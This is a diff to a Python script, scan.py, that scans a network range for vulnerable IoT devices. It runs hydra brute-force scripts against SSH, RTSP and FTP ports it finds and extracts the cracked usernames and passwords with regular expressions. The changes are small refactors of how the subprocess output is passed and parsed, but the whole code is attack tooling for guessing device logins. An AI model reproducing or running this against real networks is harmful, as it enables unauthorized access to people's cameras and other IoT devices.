@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 #   scan.py [network] [wordlist]
-#       network  - the network submask to scan for vulnerable IOT camera devices [default=192.168.0.0/24].
+#       network  - the network submask to scan for vulnerable IOT devices [default=192.168.0.0/24].
 #       wordlist - a wordlist file to be used for brute force attacks [default=wordlists/example-list.txt].
 
 
@@ -132,11 +132,11 @@ def launch_attacks(options, open_ports):
             # The hydra based attacks.
             hydra_result = None
             if(port["service"] == 'ssh'):
-                hydra_result = subprocess.run(["scripts/ssh_brute.sh", options['wordlist'], device, str(port["port"])], capture_output=True, text=True).stdout
+                hydra_result = subprocess.run(["scripts/ssh_brute.sh", options['wordlist'], device, str(port["port"])], capture_output=True, text=True)
             elif(port["service"] == 'rtsp'):
-                hydra_result = subprocess.run(["scripts/rtsp_brute.sh", options['wordlist'], device, str(port["port"]), options["rtsp_urls"]], capture_output=True, text=True).stdout
+                hydra_result = subprocess.run(["scripts/rtsp_brute.sh", options['wordlist'], device, str(port["port"]), options["rtsp_urls"]], capture_output=True, text=True)
             elif(port["service"] == 'ftp'):
-                hydra_result = subprocess.run(["scripts/ftp_brute.sh", options['wordlist'], device, str(port["port"])], capture_output=True, text=True).stdout
+                hydra_result = subprocess.run(["scripts/ftp_brute.sh", options['wordlist'], device, str(port["port"])], capture_output=True, text=True)
             
             # If hydra was used, analyze the output.
             if (hydra_result != None):
@@ -157,13 +157,13 @@ def process_hydra_result(result):
 
     # If a valid username was found, save it.
     login = None
-    matchLogin = re.search('login:(.*)', result)
+    matchLogin = re.search('login:(.*)', result.stdout)
     if(matchLogin):
         login = matchLogin.group(1).split("password: ")[0]
     
     # If a valid password was found, save it.
     password = None
-    matchPass = re.search('password:(.*)', result)
+    matchPass = re.search('password:(.*)', result.stdout)
     if(matchPass):
         password = matchPass.group(1)
 
